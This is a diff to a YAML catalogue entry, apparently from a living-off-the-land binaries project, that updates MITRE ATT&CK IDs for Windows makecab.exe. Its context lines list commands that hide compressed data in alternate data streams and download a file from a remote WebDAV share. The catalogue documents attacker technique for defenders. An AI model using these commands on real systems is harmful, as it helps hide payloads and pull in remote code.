@@ -9,16 +9,14 @@ Commands:
     Usecase: Hide data compressed into an alternate data stream
     Category: ADS
     Privileges: User
-    MitreID: T1096
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
+    MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab
     Description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
     Usecase: Hide data compressed into an alternate data stream
     Category: ADS
     Privileges: User
-    MitreID: T1096
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
+    MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
     Description: Download and compresses the target file and stores it in the target file.
@@ -26,7 +24,6 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\makecab.exe
